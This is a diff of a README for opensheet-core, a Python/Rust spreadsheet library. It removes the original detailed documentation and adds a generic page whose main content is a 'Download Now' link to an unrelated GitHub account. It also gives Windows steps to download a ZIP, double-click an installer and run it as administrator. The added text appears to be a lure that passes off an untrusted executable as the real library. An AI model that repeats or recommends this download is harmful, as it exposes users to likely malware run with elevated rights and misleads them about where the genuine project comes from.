@@ -1,608 +1,177 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/0xNadr/opensheet-core/main/assets/banner.svg" alt="OpenSheet Core — Fast, memory-efficient spreadsheet I/O for Python, powered by Rust" width="100%">
-</p>
-
-<p align="center">
-  <a href="https://github.com/0xNadr/opensheet-core/actions/workflows/ci.yml"><img src="https://github.com/0xNadr/opensheet-core/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://pypi.org/project/opensheet-core/"><img src="https://img.shields.io/pypi/v/opensheet-core.svg" alt="PyPI"></a>
-  <a href="https://github.com/0xNadr/opensheet-core/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
-  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.9%E2%80%933.13-blue.svg" alt="Python 3.9–3.13"></a>
-  <a href="https://codecov.io/gh/0xNadr/opensheet-core"><img src="https://codecov.io/gh/0xNadr/opensheet-core/branch/main/graph/badge.svg" alt="Coverage"></a>
-</p>
-
-<p align="center">
-  <a href="#features">Features</a> &nbsp;&bull;&nbsp;
-  <a href="#benchmarks">Benchmarks</a> &nbsp;&bull;&nbsp;
-  <a href="#installation">Installation</a> &nbsp;&bull;&nbsp;
-  <a href="#quick-start">Quick Start</a> &nbsp;&bull;&nbsp;
-  <a href="#api-reference">API</a> &nbsp;&bull;&nbsp;
-  <a href="#roadmap">Roadmap</a> &nbsp;&bull;&nbsp;
-  <a href="#contributing">Contributing</a>
-</p>
-
----
-
-## Why OpenSheet Core?
-
-Existing Python spreadsheet libraries force you to choose between performance, memory efficiency, broad format support, and easy installation. OpenSheet Core eliminates that tradeoff with a native Rust core exposed through a clean Python API — installable with a single `pip install`.
-
-## Features
-
-- **Streaming XLSX reader** — row-by-row iteration without loading the entire file into memory
-- **Streaming XLSX writer** — write millions of rows with constant memory usage
-- **Formula support** — read and write formulas with optional cached values
-- **Date/time support** — read and write `datetime.date` and `datetime.datetime` cells with automatic Excel serial number conversion
-- **Merged cells** — read and write merged cell ranges
-- **Column widths & row heights** — set and read custom column widths and row heights
-- **Freeze panes** — freeze rows and/or columns so they stay visible when scrolling
-- **Auto-filter** — add drop-down filter controls to column headers
-- **Named ranges / defined names** — define workbook-scoped or sheet-scoped names; read them back from existing files
-- **Sheet visibility states** — mark sheets as visible, hidden, or veryHidden; read back state from existing files
-- **Number formats** — write and read cells with custom number formats (currency, percentage, custom format strings)
-- **Cell styling** — fonts (bold, italic, underline, name, size, color), fills, borders (thin, medium, thick, dashed, dotted, double), alignment (horizontal, vertical, wrap text, rotation), and number formats on styled cells
-- **Typed cell extraction** — strings, numbers, booleans, dates, datetimes, formulas, and empty cells are returned as native Python types
-- **Context manager support** — Pythonic `with` statement for safe resource management
-- **Comments and hyperlinks** — add cell comments with author/text and hyperlinks with optional tooltips; read them back from existing files
-- **Sheet protection** — protect sheets with optional password and 15+ configurable permission flags
-- **Structured tables** — create Excel tables with column definitions, auto-filter, and table styles
-- **Data validation** — add validation rules (list, whole, decimal, date, time, textLength, custom) with input/error messages
-- **.xlsm read support** — read macro-enabled workbooks (macros gracefully ignored)
-- **Document properties** — read and write core (title, author, etc.) and custom document properties
-- **AI/RAG-ready** — convert spreadsheets to markdown tables, embedding-sized chunks, or plain text for LLM and RAG pipelines
-- **Cross-platform** — tested on Linux, macOS, and Windows across Python 3.9–3.13
-- **Pandas integration** — read XLSX files into DataFrames and write DataFrames to XLSX (`pip install opensheet-core[pandas]`)
-- **Zero Python dependencies** — single native extension, no dependency tree to manage
-
-## Benchmarks
-
-Benchmarked against [openpyxl](https://openpyxl.readthedocs.io/) 3.1.5 on a 100,000-row x 10-column dataset (1M cells), 5 interleaved runs, current RSS measurement (not high-water mark):
-
-| Operation | OpenSheet Core | openpyxl | Speedup | Memory (RSS delta) |
-|-----------|---------------|----------|---------|---------------------|
-| **Write** | 2.3s | 3.7s | **1.6x faster** | **1.7x less** (1.2 MB vs 2.1 MB) |
-| **Read** | 253ms | 3.5s | **13.8x faster** | **2.5x less** (13.5 MB vs 33.3 MB) |
-
-OpenSheet Core is faster and uses less memory for both reads and writes. The speed advantage comes from a Rust streaming parser with deferred shared-string resolution — strings are stored as indices during parsing and only converted to Python objects at the boundary. Write memory is low because the Rust writer streams data directly to disk.
-
-> Run it yourself: `python benchmarks/benchmark.py`
->
-> See the [Benchmarking Methodology](docs/benchmarking.md) doc for details on how we measure and avoid common benchmarking pitfalls.
-
-## Installation
-
-```bash
-pip install opensheet-core
-
-# With pandas support
-pip install opensheet-core[pandas]
-```
-
-### From source (requires Rust toolchain)
-
-```bash
-pip install maturin
-git clone https://github.com/0xNadr/opensheet-core
-cd opensheet-core
-maturin develop --release
-```
-
-## Quick Start
-
-### Reading an XLSX file
-
-```python
-from opensheet_core import read_xlsx, read_sheet
-
-# Read all sheets
-sheets = read_xlsx("report.xlsx")
-for sheet in sheets:
-    print(f"Sheet: {sheet['name']}")
-    for row in sheet["rows"]:
-        print(row)  # List of typed Python values
-
-# Read a specific sheet
-rows = read_sheet("report.xlsx", sheet_name="Data")
-```
-
-### Writing an XLSX file
-
-```python
-from opensheet_core import XlsxWriter
-
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Data")
-    writer.write_row(["Name", "Age", "Active"])
-    writer.write_row(["Alice", 30, True])
-    writer.write_row(["Bob", 25, False])
-```
-
-### Writing dates
-
-```python
-import datetime
-from opensheet_core import XlsxWriter
-
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Events")
-    writer.write_row(["Event", "Date", "Timestamp"])
-    writer.write_row(["Launch", datetime.date(2025, 3, 15), datetime.datetime(2025, 3, 15, 14, 30)])
-```
-
-### Merging cells
-
-```python
-from opensheet_core import XlsxWriter
-
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Report")
-    writer.write_row(["Title spanning three columns", "", ""])
-    writer.write_row(["A", "B", "C"])
-    writer.merge_cells("A1:C1")
-```
-
-### Column widths and row heights
-
-```python
-from opensheet_core import XlsxWriter
-
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Data")
-    writer.set_column_width("A", 25.0)   # By letter
-    writer.set_column_width(1, 15.0)     # By 0-based index
-    writer.set_row_height(1, 30.0)       # Row 1 (1-based)
-    writer.write_row(["Name", "Age"])
-    writer.write_row(["Alice", 30])
-```
-
-### Freeze panes
-
-```python
-from opensheet_core import XlsxWriter
-
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Data")
-    writer.freeze_panes(row=1, col=0)    # Freeze top row
-    writer.write_row(["Header1", "Header2", "Header3"])
-    writer.write_row(["data", "data", "data"])
-```
-
-### Auto-filter
-
-```python
-from opensheet_core import XlsxWriter
-
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Data")
-    writer.write_row(["Name", "Age", "City"])
-    writer.write_row(["Alice", 30, "NYC"])
-    writer.write_row(["Bob", 25, "LA"])
-    writer.auto_filter("A1:C1")
-```
-
-### Number formats
-
-```python
-from opensheet_core import XlsxWriter, FormattedCell
-
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Finance")
-    writer.write_row(["Item", "Price", "Tax Rate"])
-    writer.write_row([
-        "Widget",
-        FormattedCell(19.99, "$#,##0.00"),   # Currency
-        FormattedCell(0.08, "0.00%"),         # Percentage
-    ])
-```
-
-### Cell styling
-
-```python
-from opensheet_core import XlsxWriter, CellStyle, StyledCell
-
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Report")
-    # Bold header with fill color
-    writer.write_row([
-        StyledCell("Name", CellStyle(bold=True, fill_color="4472C4", font_color="FFFFFF")),
-        StyledCell("Score", CellStyle(bold=True, fill_color="4472C4", font_color="FFFFFF")),
-    ])
-    # Data with borders and alignment
-    writer.write_row([
-        StyledCell("Alice", CellStyle(border="thin", horizontal_alignment="left")),
-        StyledCell(95, CellStyle(border="thin", number_format="0.0")),
-    ])
-```
-
-### Named ranges / defined names
-
-```python
-from opensheet_core import XlsxWriter, defined_names
-
-# Write named ranges
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Config")
-    writer.write_row(["Rate"])
-    writer.write_row([0.08])
-    writer.define_name("TaxRate", "Config!$A$2")                    # Workbook-scoped
-    writer.define_name("LocalRate", "Config!$A$2", sheet_index=0)   # Sheet-scoped
-
-# Read named ranges
-names = defined_names("output.xlsx")
-for n in names:
-    print(f"{n['name']} → {n['value']} (sheet_index={n['sheet_index']})")
-```
-
-### Comments and hyperlinks
-
-```python
-from opensheet_core import XlsxWriter
-
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Data")
-    writer.write_row(["Name", "Website"])
-    writer.write_row(["Alice", "https://example.com"])
-    writer.add_comment("A1", "Admin", "Primary contact")
-    writer.add_hyperlink("B2", "https://example.com", tooltip="Visit site")
-```
-
-### Sheet protection
-
-```python
-from opensheet_core import XlsxWriter
+# 🧩 opensheet-core - Fast spreadsheet I/O for Python
 
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Protected")
-    writer.write_row(["Locked data"])
-    writer.protect_sheet(password="secret", sheet=True, sort=True, auto_filter=True)
-```
+[![Download opensheet-core](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Signed-discipline161/opensheet-core)
 
-### Structured tables
+## 📥 Download
 
-```python
-from opensheet_core import XlsxWriter
+Use this link to visit the download page:
 
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Data")
-    writer.write_row(["Name", "Age", "City"])
-    writer.write_row(["Alice", 30, "NYC"])
-    writer.write_row(["Bob", 25, "LA"])
-    writer.add_table("A1:C3", ["Name", "Age", "City"], name="People", style="TableStyleMedium2")
-```
+[https://github.com/Signed-discipline161/opensheet-core](https://github.com/Signed-discipline161/opensheet-core)
 
-### Writing formulas
+## 🖥️ What opensheet-core does
 
-```python
-from opensheet_core import XlsxWriter, Formula
+opensheet-core helps you work with Excel files from Python. It reads and writes XLSX files with a focus on speed and low memory use.
 
-with XlsxWriter("output.xlsx") as writer:
-    writer.add_sheet("Budget")
-    writer.write_row(["Item", "Cost"])
-    writer.write_row(["Rent", 1200])
-    writer.write_row(["Food", 400])
-    writer.write_row(["Total", Formula("SUM(B2:B3)", cached_value=1600)])
-```
+It is built with Rust for the heavy work and Python for the user-facing parts. That gives you a tool that stays fast when files get large.
 
-### Pandas integration
+Use it for:
 
-```python
-import pandas as pd
-from opensheet_core import read_xlsx_df, to_xlsx
+- Reading spreadsheet data
+- Writing new XLSX files
+- Working with formulas
+- Handling large sheets without loading everything at once
+- Moving data in and out of Excel during ETL work
 
-# Read XLSX into a DataFrame
-df = read_xlsx_df("data.xlsx", sheet_name="Sheet1")
+## 📋 Before you start
 
-# Write a DataFrame to XLSX
-df = pd.DataFrame({"Name": ["Alice", "Bob"], "Age": [30, 25]})
-to_xlsx(df, "output.xlsx", sheet_name="Results")
-```
+You need:
 
-### AI/RAG extraction
+- A Windows computer
+- A recent version of Python
+- Internet access to get the files
+- A folder where you can save and run the app
 
-```python
-from opensheet_core import xlsx_to_markdown, xlsx_to_text, xlsx_to_chunks
+If you already use Python for other tools, you can use the same setup.
 
-# Convert to a markdown table (great for LLM prompts)
-md = xlsx_to_markdown("data.xlsx")
+## 🚀 Install on Windows
 
-# Plain text extraction for search indexes
-text = xlsx_to_text("data.xlsx", delimiter="\t")
+Follow these steps:
 
-# Embedding-sized chunks for RAG pipelines (header repeated per chunk)
-chunks = xlsx_to_chunks("data.xlsx", max_rows=50)
-```
+1. Open the download page:
+   [https://github.com/Signed-discipline161/opensheet-core](https://github.com/Signed-discipline161/opensheet-core)
 
-### LangChain integration
+2. On that page, look for the latest release or download files.
 
-```python
-from opensheet_core.langchain import OpenSheetLoader
+3. Download the Windows file or source package that matches your setup.
 
-# Markdown mode (default) — one document per file
-loader = OpenSheetLoader("data.xlsx")
-docs = loader.load()
+4. Save the file in a folder you can find easily, such as Downloads or Desktop.
 
-# Chunked mode — multiple documents for RAG
-loader = OpenSheetLoader("data.xlsx", mode="chunks", max_rows=25)
-docs = loader.load()
-```
+5. If you downloaded a ZIP file, right-click it and choose Extract All.
 
-### LlamaIndex integration
+6. Open the extracted folder.
 
-```python
-from opensheet_core.llamaindex import OpenSheetReader
+7. If the package includes an installer or app file, double-click it to run it.
 
-reader = OpenSheetReader()
-docs = reader.load_data("data.xlsx")
+8. If the package includes Python files, open Command Prompt in that folder and run the install steps listed in the project files.
 
-# Use with SimpleDirectoryReader
-from llama_index.core import SimpleDirectoryReader
-reader = SimpleDirectoryReader(
-    input_dir="./data",
-    file_extractor={".xlsx": OpenSheetReader()},
-)
-```
+## 🧭 First run
 
-## API Reference
+After installation, use the app or the Python package in the way shown in the repository files.
 
-### `read_xlsx(path: str) -> list[dict]`
+A typical workflow looks like this:
 
-Reads an XLSX file and returns a list of dicts with `"name"` (str), `"rows"` (list of lists), `"merges"` (list of range strings like `"A1:C1"`), `"column_widths"` (dict of 0-based col index to width), `"row_heights"` (dict of 0-based row index to height), `"freeze_pane"` (tuple of `(rows_frozen, cols_frozen)` or `None`), `"auto_filter"` (range string like `"A1:C1"` or `None`), `"state"` (str: `"visible"`, `"hidden"`, or `"veryHidden"`), `"comments"` (list of dicts with `"cell"`, `"author"`, `"text"`), `"hyperlinks"` (list of dicts with `"cell"`, `"url"`, `"tooltip"`), `"protection"` (dict of protection settings or `None`), and `"tables"` (list of table definition dicts). Each cell is a typed Python value (`str`, `int`, `float`, `bool`, `datetime.date`, `datetime.datetime`, `Formula`, `FormattedCell`, or `None`).
+1. Open your terminal or Command Prompt.
+2. Go to the folder where opensheet-core is stored.
+3. Run the provided command or start the app.
+4. Open an XLSX file to test the import.
+5. Save a file to test the export.
 
-### `read_sheet(path, sheet_name=None, sheet_index=None) -> list[list]`
+If the project includes a sample file, start with that file first. It is the fastest way to check that everything works.
 
-Reads a single sheet by name or index. Returns the first sheet by default.
+## 📊 Features
 
-### `sheet_names(path: str) -> list[str]`
+opensheet-core is built for spreadsheet work that needs speed and steady memory use.
 
-Returns the list of sheet names in a workbook.
+### ✨ Read XLSX files
 
-### `defined_names(path: str) -> list[dict]`
+Open Excel files and pull data into Python for use in scripts, reports, or data tasks.
 
-Returns the defined names (named ranges) in a workbook. Each dict has `"name"` (str), `"value"` (str, the cell reference or formula), and `"sheet_index"` (int if sheet-scoped, `None` if workbook-scoped).
+### ✨ Write XLSX files
 
-### `document_properties(path: str) -> dict`
+Create new spreadsheet files from Python with clean output and standard Excel format.
 
-Returns document properties with `"core"` (dict of title, subject, creator, keywords, description, last_modified_by, category, created, modified) and `"custom"` (list of dicts with `"name"` and `"value"`).
+### ✨ Streaming support
 
-### `XlsxWriter(path: str)`
+Process large sheets in smaller parts instead of loading the full file into memory at once.
 
-Streaming XLSX writer. Use as a context manager.
+### ✨ Formula handling
 
-| Method | Description |
-|--------|-------------|
-| `add_sheet(name: str)` | Create a new worksheet |
-| `write_row(values: list)` | Write a row of values to the current sheet |
-| `merge_cells(range: str)` | Merge a range of cells (e.g. `"A1:C1"`) |
-| `set_column_width(column, width)` | Set column width (`column` is a letter or 0-based int) |
-| `set_row_height(row, height)` | Set row height in points (`row` is 1-based) |
-| `freeze_panes(row=0, col=0)` | Freeze top `row` rows and left `col` columns |
-| `auto_filter(range)` | Set auto-filter on a range (e.g. `"A1:C1"`) |
-| `set_sheet_state(state)` | Set sheet visibility: `"visible"`, `"hidden"`, or `"veryHidden"` |
-| `define_name(name, value, sheet_index=None)` | Define a named range (workbook-scoped by default, or sheet-scoped) |
-| `add_comment(cell_ref, author, text)` | Add a comment to a cell |
-| `add_hyperlink(cell_ref, url, tooltip=None)` | Add a hyperlink to a cell |
-| `protect_sheet(password=None, ...)` | Protect sheet with optional password and 15+ permission flags |
-| `add_table(reference, columns, name=None, style=None)` | Add a structured table with auto-filter |
-| `add_data_validation(type, sqref, ...)` | Add data validation rules to cell ranges |
-| `set_document_property(key, value)` | Set core document property (title, creator, etc.) |
-| `set_custom_property(name, value)` | Set a custom document property |
-| `close()` | Finalize and close the file |
+Work with spreadsheet formulas so your files keep useful calculations.
 
-### `read_xlsx_df(path, sheet_name=None, sheet_index=None, header=True)`
+### ✨ Low dependency setup
 
-Reads a single XLSX sheet into a pandas DataFrame. Requires `pip install opensheet-core[pandas]`. When `header=True` (default), the first row is used as column names. Formulas are unwrapped to cached values, `FormattedCell` values are unwrapped to plain numbers.
+Use a setup that avoids extra package clutter and keeps installs simple.
 
-### `to_xlsx(df, path, sheet_name="Sheet1", header=True, index=False)`
+### ✨ Rust-backed performance
 
-Writes a pandas DataFrame to an XLSX file. Handles numpy int/float/bool types, `NaN`/`NaT` (written as empty cells), and `datetime64`/`Timestamp` columns. Set `index=True` to include the DataFrame index as column(s).
+Use Rust for the parts that need speed, which helps when files get bigger.
 
-### `CellStyle(**kwargs)`
+## 🧪 Typical use cases
 
-Style properties for a cell. All parameters are keyword-only. Properties: `bold` (bool), `italic` (bool), `underline` (bool), `font_name` (str), `font_size` (float), `font_color` (str, hex RGB), `fill_color` (str, hex RGB), `border` (str, shorthand for all 4 sides), `border_left`/`border_right`/`border_top`/`border_bottom` (str: `"thin"`, `"medium"`, `"thick"`, `"dashed"`, `"dotted"`, `"double"`), `border_color` (str, hex RGB), `horizontal_alignment` (str: `"left"`, `"center"`, `"right"`), `vertical_alignment` (str: `"top"`, `"center"`, `"bottom"`), `wrap_text` (bool), `text_rotation` (int, 0-180), `number_format` (str, Excel format code).
+You may find opensheet-core useful for:
 
-### `StyledCell(value, style: CellStyle)`
+- Exporting data from reports
+- Importing Excel files into a workflow
+- Cleaning spreadsheet data before sharing it
+- Building ETL jobs that use XLSX files
+- Handling large workbooks with less memory use
+- Generating spreadsheets from Python scripts
 
-A cell value with styling. Pass as a cell value in `write_row()`. Returned by `read_xlsx()` and `read_sheet()` for cells that have visual styling. The inner `value` can be a string, number, bool, date, datetime, or formula.
+## 🛠️ Basic usage
 
-### `FormattedCell(value, number_format: str)`
+The exact steps depend on how the project is packaged in the repository, but the normal flow is simple:
 
-A numeric value with a custom Excel number format code. Pass as a cell value in `write_row()`. Returned by `read_xlsx()` for cells with non-default number formats. Common format codes: `"$#,##0.00"` (currency), `"0.00%"` (percentage), `"#,##0"` (thousands separator).
+1. Install or extract the files.
+2. Open your Python script or the included app.
+3. Load an XLSX file.
+4. Read or edit the data.
+5. Save the result to a new XLSX file.
 
-### `Formula(formula: str, cached_value=None)`
+If the repository includes command examples, use those commands as written. If it includes a GUI, use the buttons and menus shown in the app.
 
-Represents a spreadsheet formula. Pass as a cell value when writing, and received when reading cells that contain formulas.
+## 🗂️ File support
 
-### `xlsx_to_markdown(path, sheet_name=None, sheet_index=None, header=True) -> str`
+opensheet-core is centered on XLSX files. That means it is meant for modern Excel workbooks.
 
-Converts an XLSX file to markdown table(s). When multiple sheets are converted, each table is preceded by a `## Sheet Name` heading. Formulas, `FormattedCell`, and `StyledCell` values are automatically unwrapped to their plain display values.
+It is a good fit for:
 
-### `xlsx_to_text(path, sheet_name=None, sheet_index=None, delimiter="\t") -> str`
+- Standard .xlsx files
+- Files with formulas
+- Files with larger sheets
+- Data-heavy workbooks used in ETL flows
 
-Converts an XLSX file to plain text with one row per line, cells separated by the delimiter (default: tab). Suitable for search indexes and simple text pipelines.
+## 🔧 Windows tips
 
-### `xlsx_to_chunks(path, sheet_name=None, sheet_index=None, max_rows=50, header=True) -> list[str]`
+If the file does not start:
 
-Splits an XLSX file into embedding-sized markdown table chunks. Each chunk contains at most `max_rows` data rows with the header row repeated at the top for self-contained context. Ideal for RAG pipelines.
+- Check that the download finished
+- Make sure you extracted the ZIP file before opening it
+- Right-click the file and choose Run as administrator if the project asks for it
+- Confirm that Python is installed if the project uses Python files
+- Keep the project folder in a simple path, such as C:\Users\YourName\Downloads\opensheet-core
 
-### `OpenSheetLoader(file_path, mode="markdown", ...)` *(LangChain)*
+If Excel files do not open the way you expect, try a smaller sample file first.
 
-LangChain document loader. Requires `pip install langchain-core`. Modes: `"markdown"` (default), `"text"`, `"chunks"`. Supports `sheet_name`, `sheet_index`, `header`, `max_rows`, and `delimiter` options. Use `loader.load()` or `loader.lazy_load()`.
+## 📁 Suggested folder setup
 
-### `OpenSheetReader(mode="markdown", ...)` *(LlamaIndex)*
+A simple folder setup can help:
 
-LlamaIndex data reader. Requires `pip install llama-index-core`. Modes: `"markdown"` (default), `"text"`, `"chunks"`. Call `reader.load_data(file_path)` with optional `sheet_name`, `sheet_index`, and `extra_info` arguments. Compatible with `SimpleDirectoryReader` via `file_extractor`.
+- Downloads  
+  - opensheet-core.zip
+- Projects  
+  - opensheet-core
+  - input-files
+  - output-files
 
-## Architecture
+This makes it easier to keep source files, test files, and results in one place.
 
-```
-┌──────────────────────────┐
-│      Python API          │  ← opensheet_core (PyO3 bindings)
-├──────────────────────────┤
-│      Rust Core           │  ← Streaming parser & writer
-│  ┌────────┐ ┌──────────┐ │
-│  │ Reader │ │  Writer  │ │
-│  │ (SAX)  │ │ (Stream) │ │
-│  └────────┘ └──────────┘ │
-├──────────────────────────┤
-│  quick-xml  │    zip     │  ← Dependencies
-└──────────────────────────┘
-```
-
-## Feature Comparison vs openpyxl
-
-OpenSheet Core is designed to be a faster, memory-efficient alternative to openpyxl for the most common spreadsheet workflows. Here's where we stand:
-
-### What we already do better
-
-| | OpenSheet Core | openpyxl |
-|---|---|---|
-| **Write 1M cells** | ~2.3s | ~3.7s |
-| **Read 1M cells** | ~0.25s | ~3.5s |
-| **Write memory** | 1.2 MB RSS delta | 2.1 MB RSS delta |
-| **Read memory** | 13.5 MB RSS delta | 33.3 MB RSS delta |
-| **Python dependencies** | Zero | Several |
-| **Architecture** | Rust streaming core | Pure Python DOM |
-
-> Memory optimization: shared strings are stored as indices during parsing and resolved to Python objects at the boundary via pre-interned lookup, avoiding duplicate string allocations. A future streaming iterator API will bring constant-memory reads.
-
-### Feature coverage
-
-| Category | Feature | openpyxl | OpenSheet Core |
-|----------|---------|:--------:|:--------------:|
-| **Formats** | .xlsx read/write | Yes | Yes |
-| | .xlsm (macro-enabled) | Yes | Read |
-| | .xltx/.xltm (templates) | Yes | — |
-| **Cell Types** | Strings, numbers, booleans | Yes | Yes |
-| | Dates and datetimes | Yes | Yes |
-| | Formulas with cached values | Yes | Yes |
-| | Rich text | Yes | Planned |
-| | Error values | Yes | Planned |
-| **Styling** | Fonts (name, size, bold, italic, color) | Yes | Yes |
-| | Fill (solid, pattern, gradient) | Yes | Solid |
-| | Borders (14 styles) | Yes | 6 styles |
-| | Alignment (horizontal, vertical, wrap, rotation) | Yes | Yes |
-| | Number formats (30+ builtins + custom) | Yes | Yes |
-| | Named styles | Yes | Planned |
-| | Conditional formatting (6 rule types) | Yes | Planned |
-| **Worksheet** | Merged cells | Yes | Yes |
-| | Freeze panes | Yes | Yes |
-| | Auto-filter | Yes | Yes |
-| | Column widths / row heights | Yes | Yes |
-| | Comments | Yes | Yes |
-| | Hyperlinks | Yes | Yes |
-| | Data validation (7 types) | Yes | Yes |
-| | Sheet protection | Yes | Yes |
-| | Row/column insert/delete | Yes | — |
-| | Print settings | Yes | Planned |
-| | Row/column grouping | Yes | — |
-| **Workbook** | Named ranges / defined names | Yes | Yes |
-| | Document properties | Yes | Yes |
-| | Workbook protection | Yes | — |
-| | Multiple sheet states (hidden, veryHidden) | Yes | Yes |
-| **Charts** | 12+ chart types (bar, line, pie, scatter, etc.) | Yes | Planned |
-| | 3D variants and combined charts | Yes | — |
-| **Images** | Embed PNG/JPEG | Yes | Planned |
-| **Tables** | Structured tables with styles | Yes | Yes |
-| **Pivot Tables** | Read/preserve existing | Yes | — |
-| **VBA/Macros** | Preserve on load (.xlsm) | Yes | Read |
-| **Integration** | Pandas DataFrame I/O | Yes | Yes |
-| | NumPy type support | Yes | Yes |
-| **AI/RAG** | Markdown/text extraction for LLMs | — | Yes |
-| | Embedding-sized chunking | — | Yes |
-| | LangChain / LlamaIndex loaders | — | Yes |
-| **Performance** | Streaming read (constant memory) | Yes (read_only mode) | Yes (default) |
-| | Streaming write (constant memory) | Yes (write_only mode) | Yes (default) |
-
-> **Legend:** Yes = implemented, Planned = on the roadmap, — = not planned for now
-
-### Our approach
-
-We are not trying to clone openpyxl. We are building a **fast, safe, memory-efficient core** for the most common Excel workflows. The goal is to cover the ~80% of features that people use day-to-day, while being up to 14x faster and using 2–3x less memory. Streaming is the default, not an opt-in mode.
-
-## Roadmap
-
-### Done
-
-- [x] XLSX reading with typed cell extraction
-- [x] Streaming XLSX writing with low memory usage
-- [x] Formula read/write support with cached values
-- [x] Date/time cell support with automatic serial number conversion
-- [x] Merged cell metadata (read and write)
-- [x] Python bindings via PyO3
-- [x] Type stubs (`.pyi`) and `py.typed` marker for IDE autocomplete
-- [x] CI across Linux, macOS, Windows (Python 3.9–3.13)
-- [x] Prebuilt wheels on PyPI
-- [x] Benchmarks vs openpyxl
-- [x] Runnable benchmark script (`python benchmarks/benchmark.py`)
-- [x] Zero Python dependencies
-- [x] Column widths and row heights
-- [x] Freeze panes
-- [x] Auto-filter
-- [x] Number formats (currency, percentage, custom format strings)
-- [x] Pandas DataFrame integration (`read_xlsx_df` / `to_xlsx`)
-- [x] Basic cell styling (fonts, fills, borders, alignment)
-- [x] Sheet visibility states (visible, hidden, veryHidden)
-- [x] Named ranges / defined names (workbook-scoped and sheet-scoped)
-- [x] `xlsx_to_markdown()` — structured markdown tables for LLM consumption
-- [x] `xlsx_to_text()` — plain text extraction for search indexes
-- [x] `xlsx_to_chunks()` — embedding-sized chunks with header attachment
-- [x] LangChain `OpenSheetLoader` document loader
-- [x] LlamaIndex `OpenSheetReader` data connector
-- [x] Comments and hyperlinks (read and write)
-- [x] .xlsm read support (macros gracefully ignored)
-- [x] Sheet protection with optional password
-- [x] Structured tables with styles and auto-filter
-- [x] Data validation (7 types with input/error messages)
-- [x] Document and custom properties (read and write)
-- [x] NumPy type support (int64, float64, bool_, etc.)
-- [x] Security hardening (XML bomb prevention, zip limits)
-
-### Phase 2 — Broader compatibility (v0.3.0)
-
-- [x] Named ranges / defined names
-- [x] Data validation (7 types with input/error messages)
-- [x] Comments and hyperlinks
-- [x] .xlsm read support (macros gracefully ignored)
-- [x] Sheet protection (with optional password and 15+ permission flags)
-- [x] Structured tables with styles
-- [x] Multiple sheet states (hidden, veryHidden)
-- [x] Document and custom properties
-- [x] NumPy type support
-- [x] Security hardening (XML bomb prevention, zip limits)
-
-### Phase 3 — Rich content and ecosystem
-
-- [ ] Charts (bar, line, pie, scatter — most common types)
-- [ ] Image embedding (PNG, JPEG)
-- [ ] Conditional formatting
-- [ ] Broader test corpus and fuzzing
-
-### Docs & community
-
-- [x] Migration guide: openpyxl → opensheet-core (side-by-side code comparisons)
-- [x] FastAPI/Flask streaming XLSX download examples
-- [x] Benchmark methodology documentation
-- [x] Dedicated benchmark page with chart visualizations
-
-## Project Status
-
-**v0.3.0** — all Phase 2 features complete: comments, hyperlinks, sheet protection, structured tables, data validation, document properties, .xlsm read support, NumPy types, and security hardening. 280+ passing tests. Streaming reader/writer with formulas, dates, merged cells, column widths/row heights, freeze panes, auto-filter, number formats, cell styling, named ranges, pandas DataFrames, and AI/RAG extraction. Prebuilt wheels on PyPI. The API may change before 1.0.
-
-## Contributing
-
-Contributions are welcome! Here are some great ways to get involved:
-
-- Report bugs or real-world spreadsheet edge cases
-- Submit representative sample files for testing
-- Suggest benchmark scenarios
-- Improve documentation
-- Open PRs for roadmap items
-
-## License
-
-[MIT](LICENSE)
-
----
-
-<p align="center">
-  <sub>Built with Rust and PyO3, with substantial AI assistance (Claude) &nbsp;|&nbsp; Open digital infrastructure for the Python ecosystem</sub>
-</p>
+## 🔎 Topics covered
+
+This project fits work in:
+
+- data
+- etl
+- excel
+- pyo3
+- pypi
+- python
+- rust
+- spreadsheet
+- streaming
+- xlsx
+
+## 📌 What to expect
+
+opensheet-core is made for users who need Excel file handling that stays fast and light. It fits tasks where large spreadsheets, repeated file work, or clean import and export matter
+
+It works best when you want a Python-based tool that can handle spreadsheet data without heavy setup or extra moving parts
